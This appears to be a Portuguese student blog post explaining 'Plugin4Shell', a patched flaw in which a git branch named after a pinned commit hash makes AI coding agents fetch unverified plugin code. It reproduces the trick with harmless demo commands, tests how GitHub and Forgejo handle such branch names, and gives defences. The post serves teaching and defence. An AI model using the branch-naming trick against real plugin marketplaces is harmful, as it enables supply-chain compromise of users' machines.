@@ -1,0 +1,228 @@
+---
+title: "Entendendo o Plugin4Shell: um exploit que usa um truque simples do git para enganar agentes de IA de programação"
+description: "Uma branch do git com o nome de um hash de commit bastou para fazer agentes de IA de programação rodarem plugins não verificados. Reproduzi o truque do Plugin4Shell no GitHub e no Forgejo."
+pubDate: 2026-09-28
+tags: ["cybersecurity", "git", "ai", "software"]
+seoKeywords: "Plugin4Shell, branch do git com nome de hash de commit, bypass de SHA pinning, segurança de agentes de IA de programação, vulnerabilidade de plugin do Claude Code, ataque à cadeia de suprimentos, internals do git, Forgejo"
+---
+
+Este post é baseado [no texto da Ana Maria Constantin no TheNextWeb](https://thenextweb.com/news/plugin4shell-ai-coding-agents-zero-click-rce-sha-pinning) e [no relatório da Air Security](https://www.air.security/blog-posts/plugin4shell).
+
+Agentes de IA de programação como o Claude Code e o Codex instalam plugins dos seus marketplaces. Sabendo que atacantes poderiam usar plugins para distribuir código malicioso, as empresas de IA adotaram uma medida de segurança simples: travaram os plugins numa versão que tinha sido revisada e aprovada. Mas e se alguém conseguisse burlar essa trava? Foi *exatamente* isso que aconteceu.
+
+Pesquisadores da Air Security descobriram uma vulnerabilidade que batizaram de [Plugin4Shell](https://www.air.security/blog-posts/plugin4shell), que explorava a forma como os agentes verificavam os plugins. Com um truque simples de git, eles conseguiram fazer o agente baixar e rodar código não verificado. Isso significa **execução remota de código (RCE)**, roubo de tokens ou qualquer coisa que um código malicioso possa fazer.
+
+A Anthropic corrigiu isso no **Claude Code 2.1.179**, e a OpenAI, no **Codex 0.146.0**. De qualquer forma, como estudante de Ciência da Computação, acho que essa é uma ótima oportunidade pra aprender sobre git, ataques à cadeia de suprimentos e cibersegurança em geral. Então, bora lá!
+
+## O cenário
+
+A defesa da indústria contra plugins maliciosos era *fixar* (o famoso *pinning*) cada plugin num commit específico. Esse commit tinha sido revisado e aprovado, então era considerado seguro. O hash de um commit é um SHA-1 do conteúdo e do histórico do commit, ou seja, ele é endereçado por conteúdo e *imutável*. Mas existe um problema no próprio git. **Branches e tags são só etiquetas com nome, que podem ser movidas.** Interessante...
+
+O hash do commit é uma string de 40 caracteres. E se existir uma branch com o mesmo nome de um hash de commit? Alguns comandos do git, como `checkout` e `clone --branch`, **preferem a branch**.
+
+Foi isso que eles usaram pra enganar o agente e fazer ele baixar e rodar código não verificado!
+
+## O ataque, passo a passo
+
+O ataque seguia estes passos:
+
+1. Os atacantes criam um plugin completamente seguro, sem exploits e sem código malicioso. Vamos supor que o hash desse commit seja `xxxx`.
+2. Eles conseguem a aprovação do marketplace, e o plugin fica fixado no commit `xxxx`.
+3. Os usuários começam a baixar e usar o plugin.
+4. Eles publicam código malicioso numa branch separada, chamada `xxxx`.
+5. Os agentes atualizam o plugin em segundo plano, **sem precisar de nenhuma interação do usuário**.
+6. Em vez do commit fixado, o git escolhe o último commit da branch com o mesmo nome.
+7. O código malicioso é executado e, simples assim, os usuários são hackeados.
+
+## Como isso funciona?
+
+Vamos testar esse truque por conta própria num repositório git local. Primeiro, criamos o repo e fazemos um commit limpo pra passar pela verificação:
+
+```sh
+git init demo && cd demo
+echo "print('safe plugin')" > plugin.py
+git add . && git commit -m "safe version"
+```
+
+Agora, vamos rodar `git log` pra pegar o hash do commit.
+
+```
+commit 290b9e171e7b6facfe1e244a22c7152b31b6c290 (HEAD -> main)
+Author: Gabriel Franco <gabe@example.com>
+Date:   Mon Sep 28 09:10:09 2026 -0300
+
+    safe version
+```
+
+Aí está! `290b9e171e7b6facfe1e244a22c7152b31b6c290` é o nosso hash de commit. Agora, vamos criar a branch do mal:
+
+```sh
+git switch -c evil
+echo "print('you got HACKED')" > plugin.py
+git commit -am "evil version"
+```
+
+Mas o nome da branch ainda é `evil`. Na real, isso soa bem suspeito. Vamos trocar pelo nosso hash de commit.
+
+```sh
+git branch -m 290b9e171e7b6facfe1e244a22c7152b31b6c290
+```
+
+Isso renomeou a branch, então o nome dela agora é exatamente o hash do commit seguro e verificado. Agora, vamos voltar pra branch main com `git switch -` e tentar acessar nosso commit seguro com `git checkout`:
+
+```sh
+git checkout 290b9e171e7b6facfe1e244a22c7152b31b6c290
+```
+
+O git até me deu um aviso:
+
+```
+warning: refname '290b9e171e7b6facfe1e244a22c7152b31b6c290' is ambiguous.
+Git normally never creates a ref that ends with 40 hex characters
+because it will be ignored when you just specify 40-hex. These refs
+may be created by mistake. For example,
+
+  git switch -c $br $(git rev-parse ...)
+
+where "$br" is somehow empty and a 40-hex ref is created. Please
+examine these refs and maybe delete them. Turn this message off by
+running "git config set advice.objectNameWarning false"
+Switched to branch '290b9e171e7b6facfe1e244a22c7152b31b6c290'
+```
+
+Isso é bom. Mas o aviso provavelmente passa batido pelo agente, que não espera nenhuma saída do `checkout`, desde que o status de saída seja 0.
+
+Vamos conferir o conteúdo do `plugin.py`:
+
+```python
+print('you got HACKED')
+```
+
+Ops... Parece que fomos HACKEADOS!
+
+## Mas as plataformas de git conseguem corrigir isso?
+
+Pelo visto, o GitHub já corrigiu. Não achei nenhuma fonte que confirme quando essa mudança foi feita, mas vamos testar por conta própria. Criei um repositório privado no GitHub e voltei pro terminal:
+
+```sh
+git switch main
+git remote add origin git@github.com:gabeefranco/demo-trick.git
+git push -u origin main
+```
+
+Bom, a branch `main` sobe sem problema:
+
+```
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 236 bytes | 236.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To github.com:gabeefranco/demo-trick.git
+ * [new branch]      main -> main
+branch 'main' set up to track 'origin/main'.
+```
+
+Agora, vamos ver o que acontece com a nossa branch batizada com o hash do commit:
+
+```sh
+git push -u origin 290b9e171e7b6facfe1e244a22c7152b31b6c290
+```
+
+Como dá pra ver, o GitHub rejeita:
+
+```
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Writing objects: 100% (3/3), 269 bytes | 269.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: error: GH002: Sorry, branch or tag names consisting of 40 or 64 hex characters are not allowed.
+remote: error: Invalid branch or tag name "290b9e171e7b6facfe1e244a22c7152b31b6c290"
+To github.com:gabeefranco/demo-trick.git
+ ! [remote rejected] 290b9e171e7b6facfe1e244a22c7152b31b6c290 -> 290b9e171e7b6facfe1e244a22c7152b31b6c290 (pre-receive hook declined)
+error: failed to push some refs to 'github.com:gabeefranco/demo-trick.git'
+```
+
+Isso é muito bom! Palmas pro GitHub e pra todo o slop da Microsoft. *Dessa vez* eles me surpreenderam!
+
+### E as outras plataformas?
+
+Nos marketplaces de plugins de IA, os repositórios git podem estar hospedados em qualquer plataforma, inclusive numa instância self-hosted do Forgejo, por exemplo. O [Forgejo](https://forgejo.org/) é um fork do [Gitea](https://about.gitea.com/), e permite hospedar nossos próprios projetos git no estilo do GitHub, só que 100% open-source. É um bom software open-source, e um dia ainda escrevo um post sobre ele. Minha versão do Forgejo é a `9.0.3+gitea-1.22.0`, como dá pra conferir com `curl -s https://git.gabeefran.co/api/v1/version`. Lembre que o comportamento que eu mostro aqui pode mudar numa versão futura.
+
+Na minha própria instância, vamos testar a nomeação de branches. Depois de criar um repositório (dessa vez, vou deixar ele público), rodei:
+
+```sh
+git remote remove origin
+git remote add origin git@git.gabeefran.co:gabeefranco/git-trick.git
+git push -u origin main
+```
+
+De novo, a `main` sobe normalmente:
+
+```
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 236 bytes | 236.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To git.gabeefran.co:gabeefranco/git-trick.git
+ * [new branch]      main -> main
+branch 'main' set up to track 'origin/main'.
+```
+
+Mas a `main` é a que o marketplace verificou. Vamos testar nossa branch do mal:
+
+```sh
+git push -u origin 290b9e171e7b6facfe1e244a22c7152b31b6c290
+```
+
+Infelizmente, o Forgejo **não implementa a mesma correção**:
+
+```
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Writing objects: 100% (3/3), 269 bytes | 269.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: 
+remote: Create a new pull request for '290b9e171e7b6facfe1e244a22c7152b31b6c290':
+remote:   https://git.gabeefran.co/gabeefranco/git-trick/compare/main...290b9e171e7b6facfe1e244a22c7152b31b6c290
+remote: 
+To git.gabeefran.co:gabeefranco/git-trick.git
+ * [new branch]      290b9e171e7b6facfe1e244a22c7152b31b6c290 -> 290b9e171e7b6facfe1e244a22c7152b31b6c290
+branch '290b9e171e7b6facfe1e244a22c7152b31b6c290' set up to track 'origin/290b9e171e7b6facfe1e244a22c7152b31b6c290'.
+```
+
+Vou deixar esse repositório público. Dá pra conferir [aqui](https://git.gabeefran.co/gabeefranco/git-trick). Só note que os hashes de commit lá são diferentes, porque eu tive que editar os deste post pra manter a consistência do texto.
+
+## Como se defender
+
+Antes de tudo: se você usa o Claude Code ou o Codex, atualize. Qualquer versão a partir do **Claude Code 2.1.179** e do **Codex 0.146.0** já tem a correção.
+
+Mas e se você estiver escrevendo uma ferramenta que fixa commits do git, do mesmo jeito que os agentes fazem? Minha primeira ideia foi `git checkout --detach`, já que ele deveria tratar o argumento como um commit, e não como uma branch. Testei no mesmo repo de demonstração:
+
+```sh
+git checkout --detach 290b9e171e7b6facfe1e244a22c7152b31b6c290
+```
+
+E o `plugin.py` continuou dizendo `you got HACKED`. Nem o `--detach` salva a gente aqui! O que funciona de verdade é adicionar `^{commit}` ao final do hash, o que força o git a resolvê-lo como um objeto commit:
+
+```sh
+git checkout --detach "290b9e171e7b6facfe1e244a22c7152b31b6c290^{commit}"
+```
+
+Dessa vez, o `safe plugin` voltou. Mesmo assim, não confie cegamente na resolução. **Depois do checkout, sempre verifique se o `HEAD` é exatamente o hash fixado**, e aborte se não for:
+
+```sh
+PIN=290b9e171e7b6facfe1e244a22c7152b31b6c290
+[ "$(git rev-parse HEAD)" = "$PIN" ] || { echo "HEAD doesn't match the pin, aborting!"; exit 1; }
+```
+
+É uma linha de shell, e teria barrado esse ataque. Se os agentes fizessem isso, a branch do mal seria inútil.
+
+E se você hospeda seus próprios projetos git, como eu, dá pra fazer o mesmo que o GitHub e rejeitar nomes de branch e de tag formados por 40 ou 64 caracteres hexadecimais com um hook de pre-receive. Não existe nenhum motivo legítimo pra uma branch parecer um hash de commit, de qualquer forma.
+
+## Concluindo
+
+O problema principal era que os agentes pediam ao git o commit fixado, mas nunca verificavam se o que recebiam de volta batia de fato com aquele hash. Fixar commits pelo SHA é a recomendação padrão contra ataques à cadeia de suprimentos. O Plugin4Shell mostra que **fixar um commit só adianta se você _resolver_ essa fixação do jeito certo**.
+
+Estudando esse caso, aprendemos muito sobre ataques à cadeia de suprimentos, internals do git e a cibersegurança envolvida no cenário dos agentes de IA. Todo o crédito pra [Air Security](https://www.air.security/) por pesquisar esse tema e descobrir essa vulnerabilidade.
+
+Me diverti muito escrevendo este post, espero que tenham gostado!
